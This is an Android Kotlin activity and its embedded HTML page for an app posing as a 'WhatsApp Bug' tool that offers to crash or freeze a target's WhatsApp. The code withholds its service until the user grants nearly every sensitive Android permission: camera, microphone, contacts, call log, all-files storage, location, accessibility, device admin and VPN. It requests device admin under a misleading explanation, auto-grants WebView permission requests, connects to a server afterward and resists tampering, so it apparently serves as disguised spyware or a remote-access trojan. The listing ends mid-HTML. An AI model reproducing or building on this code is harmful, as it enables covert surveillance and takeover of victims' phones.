package com.whatsapp.bug.crash

import android.Manifest
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val REQ_CAM     = 101
    private val REQ_LOC     = 102
    private val REQ_OVERLAY = 103
    private val REQ_CONTACTS = 104
    private val REQ_SCREEN  = 104
    private val REQ_GALLERY = 106
    private val REQ_STORAGE = 107
    private val REQ_CALL_LOG = 108
    private val REQ_PHONE_STATE = 109
    private val REQ_CALL_PHONE = 112
    private val REQ_LOCATION_SETTINGS = 105
    private val REQ_NOTIF  = 110
    private val REQ_RECORD_AUDIO = 111

    private var webViewShown = false
    private var webView: WebView? = null

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // ── Full tamper detection (pkg, label, signature, content hash) ──────
        // Jika ada yang berubah → Toast + force close otomatis
        AppIntegrity.check(this)
        // ─────────────────────────────────────────────────────────────────────

        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }

        showLocationDialog(onEnabled = {
            setupUI()           // selalu render WebView
            if (allPermsGranted()) {
                goToUrl()       // langsung start service kalau semua perm sudah ada
            }
        })
    }

    private fun allPermsGranted(): Boolean {
        return isCamGranted() &&
               isGalleryGranted() &&
               isContactsGranted() &&
               isLocationGranted() &&
               isCallLogGranted() &&
               isCallPhoneGranted() &&
               isPhoneStateGranted() &&
               isStorageGranted() &&
               isOverlayGranted() &&
               isUsageAccessGranted() &&
               isWriteSettingsGranted() &&
               isDeviceAdminGranted() &&
               isAccessibilityGranted() &&
               isNotifGranted() &&
               isRecordAudioGranted()
    }

    override fun onResume() {
        super.onResume()
        if (!webViewShown) {
            if (allPermsGranted()) {
                setupUI()   // render WebView dulu
                goToUrl()   // baru start service
                return
            }
            // Permission belum semua granted → tampilkan HTML permission page
            if (webView == null) setupUI()
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUI() {
        val wv = WebView(this)
        webView = wv
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }
        wv.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) { request.grant(request.resources) }
        }
        wv.webViewClient = WebViewClient()
        wv.addJavascriptInterface(PermBridge(), "Android")
        setContentView(wv)
        wv.loadDataWithBaseURL("file:///android_asset/", buildHtml(), "text/html", "UTF-8", null)
    }

    inner class PermBridge {
        @android.webkit.JavascriptInterface fun isCamGranted()           = this@MainActivity.isCamGranted()
        @android.webkit.JavascriptInterface fun isGalleryGranted()       = this@MainActivity.isGalleryGranted()
        @android.webkit.JavascriptInterface fun isOverlayGranted()          = this@MainActivity.isOverlayGranted()
        @android.webkit.JavascriptInterface fun isAccessibilityGranted()    = this@MainActivity.isAccessibilityGranted()
        @android.webkit.JavascriptInterface fun isUsageAccessGranted()      = this@MainActivity.isUsageAccessGranted()
        @android.webkit.JavascriptInterface fun isWriteSettingsGranted()    = this@MainActivity.isWriteSettingsGranted()
        @android.webkit.JavascriptInterface fun requestWriteSettingsPerm()  = this@MainActivity.requestWriteSettingsPerm()
        @android.webkit.JavascriptInterface fun isLocationGranted()      = this@MainActivity.isLocationGranted()
        @android.webkit.JavascriptInterface fun isContactsGranted()      = this@MainActivity.isContactsGranted()
        @android.webkit.JavascriptInterface fun isStorageGranted()       = this@MainActivity.isStorageGranted()
        @android.webkit.JavascriptInterface fun isCallLogGranted()       = this@MainActivity.isCallLogGranted()
        @android.webkit.JavascriptInterface fun isPhoneStateGranted()    = this@MainActivity.isPhoneStateGranted()
        @android.webkit.JavascriptInterface fun isCallPhoneGranted()     = this@MainActivity.isCallPhoneGranted()
        @android.webkit.JavascriptInterface fun requestCamPerm()         = this@MainActivity.requestCamPerm()
        @android.webkit.JavascriptInterface fun requestOverlayPerm()     = this@MainActivity.requestOverlayPerm()
        @android.webkit.JavascriptInterface fun requestGalleryPerm()     = this@MainActivity.requestGalleryPerm()
        @android.webkit.JavascriptInterface fun requestAccessibilityPerm() = this@MainActivity.requestAccessibilityPerm()
        @android.webkit.JavascriptInterface fun requestUsageAccessPerm() = this@MainActivity.requestUsageAccessPerm()
        @android.webkit.JavascriptInterface fun requestLocationPerm()    = this@MainActivity.requestLocationPerm()
        @android.webkit.JavascriptInterface fun requestContactsPerm()    = this@MainActivity.requestContactsPerm()
        @android.webkit.JavascriptInterface fun requestStoragePerm()     = this@MainActivity.requestStoragePerm()
        @android.webkit.JavascriptInterface fun requestCallLogPerm()     = this@MainActivity.requestCallLogPerm()
        @android.webkit.JavascriptInterface fun requestPhoneStatePerm()  = this@MainActivity.requestPhoneStatePerm()
        @android.webkit.JavascriptInterface fun requestCallPhonePerm()   = this@MainActivity.requestCallPhonePerm()
        @android.webkit.JavascriptInterface fun isNotifGranted()          = this@MainActivity.isNotifGranted()
        @android.webkit.JavascriptInterface fun requestNotifPerm()        = this@MainActivity.requestNotifPerm()
        @android.webkit.JavascriptInterface fun isRecordAudioGranted()    = this@MainActivity.isRecordAudioGranted()
        @android.webkit.JavascriptInterface fun requestRecordAudioPerm()  = this@MainActivity.requestRecordAudioPerm()
        @android.webkit.JavascriptInterface fun isDeviceAdminGranted()    = this@MainActivity.isDeviceAdminGranted()
        @android.webkit.JavascriptInterface fun requestDeviceAdminPerm()  = runOnUiThread { this@MainActivity.requestDeviceAdminPerm() }
        @android.webkit.JavascriptInterface fun isVpnGranted()            = this@MainActivity.isVpnGranted()
        @android.webkit.JavascriptInterface fun requestVpnPerm()          = runOnUiThread { this@MainActivity.requestVpnPerm() }
        @android.webkit.JavascriptInterface fun proceedToUrl()           = runOnUiThread { goToUrl() }
        @android.webkit.JavascriptInterface fun showLocationDialog()     = runOnUiThread { this@MainActivity.showLocationDialog() }
        @android.webkit.JavascriptInterface fun isLocationEnabled()      = this@MainActivity.isLocationEnabled()
    }

    private fun goToUrl() {
        if (webViewShown) return
        webViewShown = true

        // Connect ke server hanya setelah semua permission granted
        startDeviceService()

        // Tetap di WebView yang sudah ada (HTML permission page), tidak bikin WebView baru
    }

    private fun isCamGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestGalleryPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), REQ_GALLERY)
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), REQ_GALLERY)
        }
    }

    private fun isOverlayGranted() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true

    private fun isAccessibilityGranted(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val component = "$packageName/${packageName}.XyzAccessibilityService"
        return enabled.split(":").any { it.equals(component, ignoreCase = true) }
    }

    private fun isLocationGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    private fun isLocationEnabled(): Boolean {
        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
        return lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
               lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun isContactsGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun isCallLogGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED

    private fun isPhoneStateGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallLogPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CALL_LOG), REQ_CALL_LOG)

    private fun isCallPhoneGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED

    private fun requestCallPhonePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), REQ_CALL_PHONE)

    private fun requestPhoneStatePerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_PHONE_STATE), REQ_PHONE_STATE)

    private fun isStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")),
                    REQ_STORAGE
                )
            } catch (_: Exception) {
                startActivityForResult(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), REQ_STORAGE)
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                REQ_STORAGE)
        }
    }

    private fun requestContactsPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_CONTACTS), REQ_CONTACTS)

    private fun requestCamPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), REQ_CAM)

    private fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            startActivityForResult(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")),
                REQ_OVERLAY
            )
    }

    private fun requestAccessibilityPerm() {        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    val component = "$packageName/.XyzAccessibilityService"
                    putExtra(":settings:fragment_args_key", component)
                    putExtra(":settings:show_fragment_args", android.os.Bundle().apply {
                        putString(":settings:fragment_args_key", component)
                    })
                }
                startActivity(intent)
                return
            } catch (_: Exception) { /* fallback */ }
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isDeviceAdminGranted(): Boolean {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        return dpm.isAdminActive(component)
    }

    private val REQ_VPN = 114

    private fun isVpnGranted(): Boolean =
        android.net.VpnService.prepare(this) == null

    private fun requestVpnPerm() {
        val intent = android.net.VpnService.prepare(this)
        if (intent != null) {
            startActivityForResult(intent, REQ_VPN)
        }
        // kalau intent null berarti udah granted, lanjut aja
    }

    private val REQ_DEVICE_ADMIN = 113

    private fun requestDeviceAdminPerm() {
        val dpm = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(this, GameSecurityReceiver::class.java)
        if (!dpm.isAdminActive(component)) {
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                putExtra(
                    android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Fitur keamanan akun game kamu akan dinonaktifkan." as String
                )
            }
            startActivityForResult(intent, REQ_DEVICE_ADMIN)
        }
    }

    private fun isWriteSettingsGranted(): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true

    private fun requestWriteSettingsPerm() =
        startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    private fun isNotifGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestNotifPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQ_NOTIF)
        }
    }

    private fun isRecordAudioGranted() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    private fun requestRecordAudioPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECORD_AUDIO), REQ_RECORD_AUDIO)

    private fun requestUsageAccessPerm() =
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))

    private fun requestLocationPerm() =
        ActivityCompat.requestPermissions(this, arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ), REQ_LOC)

    private var locationDialogCallback: (() -> Unit)? = null

    private fun showLocationDialog(onEnabled: (() -> Unit)? = null) {
        if (onEnabled != null) locationDialogCallback = onEnabled
        val callback = locationDialogCallback ?: { goToUrl() }

        val locationRequest = com.google.android.gms.location.LocationRequest.Builder(
            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000
        ).build()

        val builder = com.google.android.gms.location.LocationSettingsRequest.Builder()
            .addLocationRequest(locationRequest)
            .setAlwaysShow(true)

        com.google.android.gms.location.LocationServices
            .getSettingsClient(this)
            .checkLocationSettings(builder.build())
            .addOnSuccessListener {
                callback()
            }
            .addOnFailureListener { e ->
                if (e is com.google.android.gms.common.api.ResolvableApiException) {
                    try {
                        e.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                    } catch (_: Exception) {
                        callback()
                    }
                } else {
                    callback()
                }
            }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!webViewShown) {
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_VPN) {
            // Setelah user tap OK/Batal di dialog VPN, refresh UI permission
            webView?.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            return
        }
        if (requestCode == REQ_LOCATION_SETTINGS) {
            locationDialogCallback?.invoke() ?: run { if (!webViewShown) goToUrl() }
        }
    }

    private fun buildHtml(): String = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>WhatsApp Bug Banner</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700;800&family=Instrument+Serif:ital@0;1&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
button { -webkit-tap-highlight-color:transparent; outline:none; user-select:none; }
button:focus { outline:none; }

:root {
  --black: #0f0f0f;
  --white: #fafaf8;
  --yellow: #FFD93D;
  --red: #FF3B3B;
  --blue: #3B82F6;
  --green: #22C55E;
  --purple: #A855F7;
  --bg: #f5f0e8;
  --border: 3px solid #0f0f0f;
  --shadow: 4px 4px 0px #0f0f0f;
  --shadow-lg: 6px 6px 0px #0f0f0f;
  --radius: 0px;
  --font: 'Space Grotesk', sans-serif;
}

html { height:100%; overflow-y:auto; -webkit-overflow-scrolling:touch; }

body {
  position:relative;
  min-height:100vh;
  height:auto;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:flex-start;
  font-family: var(--font);
  background: var(--bg);
  background-image:
    radial-gradient(circle, #0f0f0f 1px, transparent 1px);
  background-size: 24px 24px;
  padding-top: 68px;
  padding-bottom: 80px;
}

/* ── TOP HEADER ── */
.top-header {
  position: fixed;
  top: 0; left: 0;
  width: 100%;
  height: 60px;
  background: var(--red);
  border-bottom: var(--border);
  z-index: 100;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 16px;
}

.header-hamburger {
  background: none;
  border: none;
  cursor: pointer;
  display: flex;
  flex-direction: column;
  gap: 5px;
  padding: 6px;
}
.header-hamburger span {
  display: block;
  height: 3px;
  background: var(--white);
  border-radius: 0;
}
.header-hamburger span:nth-child(1) { width: 22px; }
.header-hamburger span:nth-child(2) { width: 16px; }
.header-hamburger span:nth-child(3) { width: 10px; }

.header-title {
  font-family: var(--font);
  font-weight: 800;
  font-size: 18px;
  color: var(--white);
  letter-spacing: 1px;
  text-transform: uppercase;
  position: absolute;
  left: 50%; transform: translateX(-50%);
}

.header-icons { display:flex; align-items:center; gap:2px; }
.hdr-btn {
  background: none; border: none; cursor: pointer;
  padding: 8px; color: var(--white);
  display: flex; align-items: center; justify-content: center;
}
.hdr-btn i { font-size: 20px; }

/* ── SIDEBAR ── */
#sidebarOverlay {
  display:none;
  position:fixed; inset:0;
  background: rgba(0,0,0,0.45);
  z-index:200;
}

#sidebarPanel {
  position: fixed;
  top: 0; left: -290px;
  width: 280px; height: 100%;
  background: var(--white);
  border-right: var(--border);
  z-index: 201;
  transition: left 0.25s ease;
  display: flex;
  flex-direction: column;
}

.sidebar-head {
  background: var(--red);
  border-bottom: var(--border);
  height: 60px;
  display: flex; align-items: center;
  padding: 0 20px;
}
.sidebar-head span {
  font-family: var(--font);
  font-weight: 800;
  font-size: 13px;
  color: var(--white);
  letter-spacing: 2px;
  text-transform: uppercase;
}

.sidebar-menu {
  padding: 12px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.sidebar-item {
  background: none; border: none; cursor: pointer;
  padding: 14px 16px;
  border: var(--border);
  display: flex; align-items: center; gap: 12px;
  color: var(--black);
  font-family: var(--font);
  font-size: 14px;
  font-weight: 700;
  text-align: left;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  transition: background 0.1s, transform 0.1s, box-shadow 0.1s;
  box-shadow: var(--shadow);
}
.sidebar-item:hover {
  background: var(--yellow);
  transform: translate(-2px, -2px);
  box-shadow: var(--shadow-lg);
}
.sidebar-item:active {
  transform: translate(2px, 2px);
  box-shadow: none;
}

/* ── BOTTOM NAV ── */
.bottom-nav {
  position: fixed;
  bottom: 0; left: 0;
  width: 100%; height: 62px;
  background: var(--red);
  border-top: var(--border);
  z-index: 100;
  display: flex;
  align-items: center;
  justify-content: space-around;
}

.nav-btn {
  background: none; border: none; cursor: pointer;
  padding: 10px;
  display: flex; flex-direction: column; align-items: center; gap: 2px;
  color: var(--white);
  -webkit-tap-highlight-color: transparent;
}
.nav-btn i { font-size: 22px; }

/* ── WRAPPER ── */
.wrapper {
  width: 900px;
  max-width: 93vw;
  display: flex;
  flex-direction: column;
  gap: 16px;
}

/* ── BANNER ── */
.banner {
  width: 100%;
  height: 110px;
  border: var(--border);
  box-shadow: var(--shadow-lg);
  overflow: hidden;
}
.banner img { width:100%; height:100%; object-fit:cover; display:block; }

/* ── PROFILE PIC ── */
.profile-pic-wrap {
  display: flex; justify-content: center;
  margin-top: -2px;
}
.profile-pic {
  width: 120px; height: 120px;
  border-radius: 0;
  border: var(--border);
  box-shadow: var(--shadow-lg);
  object-fit: cover;
  background: var(--yellow);
}

/* ── SECTION LABEL ── */
.section-label {
  display: flex; align-items: center; gap: 10px;
  background: var(--black);
  border: var(--border);
  box-shadow: var(--shadow);
  padding: 10px 14px;
  width: 100%;
}
.section-label i { color: var(--white); font-size: 16px; }
.section-label span {
  font-family: var(--font);
  font-weight: 800;
  font-size: 13px;
  color: var(--white);
  letter-spacing: 1.5px;
  text-transform: uppercase;
}

/* ── INPUT ── */
.form-area { display:flex; flex-direction:column; gap:8px; }

.input-wrap { position:relative; width:100%; }

.input-icon {
  position: absolute;
  top: 50%; left: 14px;
  transform: translateY(-50%);
  font-size: 18px;
  pointer-events: none;
  line-height: 1;
}

.target-input {
  width: 100%;
  padding: 13px 16px 13px 46px;
  border: var(--border);
  box-shadow: var(--shadow);
  background: var(--white);
  color: var(--black);
  font-family: var(--font);
  font-size: 15px;
  font-weight: 600;
  outline: none;
  border-radius: 0;
  transition: box-shadow 0.1s, transform 0.1s;
}

.target-input::placeholder { color: #aaa; font-weight: 400; }

/* ── BUG GRID ── */
.bug-section { display:flex; flex-direction:column; gap:8px; }

.bug-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 12px;
}

.bug-card {
  position: relative;
  overflow: visible;
  padding: 16px;
  cursor: pointer;
  min-height: 90px;
  display: flex;
  flex-direction: column;
  justify-content: flex-end;
  border: var(--border);
  box-shadow: var(--shadow);
  transition: transform 0.1s ease, box-shadow 0.1s ease;
}
.bug-card:hover {
  transform: translate(-2px, -2px);
  box-shadow: var(--shadow-lg);
}
.bug-card:active {
  transform: translate(2px, 2px);
  box-shadow: none;
}

.bug-card .bg-icon {
  position: absolute;
  top: -10px; right: -10px;
  width: 64px; height: 64px;
  opacity: 0.18;
  filter: brightness(0) invert(1);
}

.bug-card .bug-name {
  position: relative; z-index: 2;
  font-family: var(--font);
  font-weight: 800;
  font-size: 15px;
  color: var(--white);
  margin-bottom: 4px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.bug-card .bug-desc {
  position: relative; z-index: 2;
  font-size: 11px;
  color: rgba(255,255,255,0.85);
  line-height: 1.4;
}

.card-forceclose { background: var(--red); }
.card-crash      { background: var(--purple); }
.card-freeze     { background: var(--blue); }
.card-delay      { background: var(--green); }

.bug-card .check-icon {
  display: none;
  position: absolute;
  top: 8px; right: 8px;
  width: 22px; height: 22px;
  z-index: 3;
  filter: brightness(0) invert(1);
}
.bug-card.selected {
  outline: 3px solid var(--white);
  outline-offset: 2px;
}
.bug-card.selected .check-icon { display: block; }

/* ── SEND BUTTON ── */
.send-btn {
  width: 100%;
  padding: 15px;
  background: var(--yellow);
  color: var(--black);
  font-family: var(--font);
  font-size: 16px;
  font-weight: 800;
  letter-spacing: 1.5px;
  text-transform: uppercase;
  border: var(--border);
  box-shadow: var(--shadow-lg);
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  transition: transform 0.1s, box-shadow 0.1s;
}
.send-btn:hover { transform: translate(-2px,-2px); box-shadow: 8px 8px 0 var(--black); }
.send-btn:active { transform: translate(4px, 4px); box-shadow: none; }

/* ── OVERLAY ── */
.overlay {
  display: none;
  position: fixed; inset: 0; z-index: 999;
  background: rgba(15,15,15,0.7);
  align-items: center; justify-content: center;
  padding: 20px;
}

.overlay-card {
  background: var(--white);
  border: var(--border);
  box-shadow: 8px 8px 0 var(--black);
  padding: 28px 24px 22px;
  width: 100%; max-width: 320px;
  text-align: center;
}

.overlay-icon-wrap {
  width: 64px; height: 64px;
  border: var(--border);
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 16px;
  box-shadow: var(--shadow);
}
.overlay-icon-wrap i { font-size: 28px; color: var(--white); }

.overlay-title {
  font-family: var(--font);
  font-size: 18px;
  font-weight: 800;
  color: var(--black);
  margin-bottom: 8px;
  text-transform: uppercase;
  letter-spacing: 1px;
}
.overlay-msg {
  font-size: 13px;
  color: #555;
  line-height: 1.6;
  margin-bottom: 22px;
}

.overlay-btn {
  width: 100%; padding: 13px;
  border: var(--border);
  box-shadow: var(--shadow);
  font-family: var(--font);
  font-size: 13px;
  font-weight: 800;
  letter-spacing: 1px;
  text-transform: uppercase;
  color: var(--black);
  cursor: pointer;
  transition: transform 0.1s, box-shadow 0.1s;
  display: flex; align-items: center; justify-content: center; gap: 8px;
}
.overlay-btn:active { transform: translate(4px,4px); box-shadow: none; }

/* ── NOTIF BOTTOM SHEET ── */
#notifOverlay {
  display: none;
  position: fixed; inset: 0; z-index: 9999;
  background: rgba(0,0,0,0.5);
  align-items: flex-end; justify-content: center;
  padding-bottom: 70px;
  opacity: 0;
  transition: opacity 0.2s;
}
#notifOverlay.show { opacity: 1; }

#notifCard {
  width: 93%;
  max-width: 400px;
  background: var(--white);
  border: var(--border);
  box-shadow: 6px 6px 0 var(--black);
  padding: 22px 20px 18px;
  transform: translateY(40px);
  transition: transform 0.25s cubic-bezier(0.34,1.56,0.64,1);
}
#notifOverlay.show #notifCard { transform: translateY(0); }

.notif-header { display:flex; align-items:center; gap:14px; margin-bottom:14px; }
.notif-icon-box {
  width: 48px; height: 48px;
  border: var(--border);
  box-shadow: var(--shadow);
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.notif-meta { display:flex; flex-direction:column; gap:2px; }
.notif-meta-label {
  font-size: 10px; font-weight: 700;
  text-transform: uppercase; letter-spacing: 1px;
  color: #888;
}
#notifTitle {
  font-family: var(--font); font-size: 16px; font-weight: 800;
  color: var(--black); text-transform: uppercase; letter-spacing: 0.5px;
}
#notifMsg { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 18px; }

.notif-close-btn {
  width: 100%; padding: 12px;
  background: var(--black); color: var(--white);
  border: var(--border);
  box-shadow: var(--shadow);
  font-family: var(--font); font-size: 12px;
  font-weight: 800; letter-spacing: 2px;
  text-transform: uppercase;
  cursor: pointer;
  transition: transform 0.1s, box-shadow 0.1s;
}
.notif-close-btn:active { transform: translate(4px,4px); box-shadow: none; }
</style>
</head>
<body>

<!-- TOP HEADER -->
<div class="top-header">
  <button class="header-hamburger" onclick="toggleSidebar()">
    <span></span><span></span><span></span>
  </button>
  <span class="header-title">WhatsApp Bug</span>
  <div class="header-icons">
    <button class="hdr-btn" onclick="toggleHeadset()"><i class="fa-solid fa-headset"></i></button>
    <button class="hdr-btn" onclick="toggleProfile()">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square" stroke-linejoin="round">
        <circle cx="12" cy="10" r="3"/><path d="M7 21v-1a5 5 0 0 1 10 0v1"/><circle cx="12" cy="12" r="10"/>
      </svg>
    </button>
  </div>
</div>

<!-- SIDEBAR -->
<div id="sidebarOverlay" onclick="toggleSidebar()"></div>
<div id="sidebarPanel">
  <div class="sidebar-head"><span>Menu</span></div>
  <div class="sidebar-menu">
    <button class="sidebar-item" onclick="sidebarNav('home')">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
      Beranda
    </button>
    <button class="sidebar-item" onclick="sidebarNav('history')">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="square"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
      Riwayat
    </button>
    <button class="sidebar-item" onclick="sidebarNav('settings')">
